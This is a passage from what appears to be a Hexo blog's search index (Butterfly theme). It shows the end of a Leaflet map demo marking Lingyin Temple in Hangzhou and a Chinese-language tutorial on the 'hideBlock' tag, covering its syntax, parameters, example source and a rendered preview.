normalm4=L.tileLayer.chinaProvider('Geoq.Normal.Warm',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm5=L.tileLayer.chinaProvider('Geoq.Theme.Hydro',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm1,normalm2,normalm3,normalm4,normalm5]);var baseLayers={"智图地图":normalm1,"午夜蓝":normalm2,"灰色":normalm3,"暖色":normalm4,"水系":normalm5};var mymap=L.map("geoqMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:13,layers:[normalm3],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("这里是西湖灵隐寺，据说求姻缘很灵验哦！").openPopup();</script>`<br>`<button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="隐藏块">隐藏块</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock display,bg,color %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>content：要隐藏的内容</li><li>display：展示前按钮显示的文字（可选）</li><li>bg：按钮的背景颜色（可选）</li><li>color：按钮显示的文字的颜色（可选）</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock 点我预览, blue %&#125;</span><br><span class="line">这里有张图片：</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;image (1)&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:67%;&quot;</span> /&gt;</span></span></span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="hide-block"><button type="button" class="hide-button" style="background-color:  blue;">点我预览    </button><div class="hide-content"><p>这里有张图片：<br><code>&lt;img src=&quot;https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb&quot; alt=&quot;image (1)&quot; style=&quot;zoom:67%;&quot; /&gt;</code></p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Butterfly </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
